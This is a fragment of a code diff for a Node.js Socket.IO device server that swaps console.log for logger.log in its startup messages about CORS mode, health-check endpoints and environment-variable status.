   if (process.env.NEXT_PUBLIC_DEVICE_SERVER_URL) {
-    console.log(`   Configured URL: ${process.env.NEXT_PUBLIC_DEVICE_SERVER_URL}`);
+    logger.log(`   Configured URL: ${process.env.NEXT_PUBLIC_DEVICE_SERVER_URL}`);
   }
-  console.log(`   Socket.IO path: /socket.io`);
-  console.log(`   CORS: ${isDevelopment ? 'Permissive (development mode - all origins allowed)' : 'Strict (production mode)'}`);
-  console.log(`   Allowed origins:`, allowedOrigins);
-  console.log(`\n💡 [Device Server] If you see "xhr poll error":`);
-  console.log(`   1. Verify server is accessible at the configured URL`);
-  console.log(`   2. Check tunnel is running and forwarding to port ${PORT}`);
-  console.log(`   3. Check firewall/network settings`);
-  console.log(`   4. Test connection: curl http://localhost:${PORT}/health\n`);
-  console.log(`📡 [Device Server] Socket.IO path: /socket.io`);
-  console.log(`🔍 [Device Server] Health check: http://localhost:${PORT}/api/health`);
-  console.log(`🔍 [Device Server] Socket status: http://localhost:${PORT}/api/socket-status`);
-  console.log(`📋 [Device Server] Environment: ${isDevelopment ? 'Development' : 'Production'}`);
+  logger.log(`   Socket.IO path: /socket.io`);
+  logger.log(`   CORS: ${isDevelopment ? 'Permissive (development mode - all origins allowed)' : 'Strict (production mode)'}`);
+  logger.log(`   Allowed origins:`, allowedOrigins);
+  logger.log(`\n💡 [Device Server] If you see "xhr poll error":`);
+  logger.log(`   1. Verify server is accessible at the configured URL`);
+  logger.log(`   2. Check tunnel is running and forwarding to port ${PORT}`);
+  logger.log(`   3. Check firewall/network settings`);
+  logger.log(`   4. Test connection: curl http://localhost:${PORT}/health\n`);
+  logger.log(`📡 [Device Server] Socket.IO path: /socket.io`);
+  logger.log(`🔍 [Device Server] Health check: http://localhost:${PORT}/api/health`);
+  logger.log(`🔍 [Device Server] Socket status: http://localhost:${PORT}/api/socket-status`);
+  logger.log(`📋 [Device Server] Environment: ${isDevelopment ? 'Development' : 'Production'}`);
   
   // Log environment variable status
-  console.log(`\n📋 [Device Server] Environment Variables:`);
-  console.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? '✅ Set' : '❌ Missing'}`);
-  console.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? '✅ Set' : '❌ Missing'}`);
-  console.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
-  console.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
-  console.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
+  logger.log(`\n📋 [Device Server] Environment Variables:`);
+  logger.log(`   NEXT_PUBLIC_SUPABASE_URL: ${supabaseUrl ? '✅ Set' : '❌ Missing'}`);
+  logger.log(`   SUPABASE_SERVICE_ROLE_KEY: ${supabaseServiceKey ? '✅ Set' : '❌ Missing'}`);
+  logger.log(`   NEXT_PUBLIC_APP_URL: ${process.env.NEXT_PUBLIC_APP_URL || '❌ Not set (using defaults)'}`);
+  logger.log(`   ALLOWED_ORIGINS: ${process.env.ALLOWED_ORIGINS || '❌ Not set (using defaults)'}`);
+  logger.log(`   NODE_ENV: ${process.env.NODE_ENV || 'development'}`);
 });
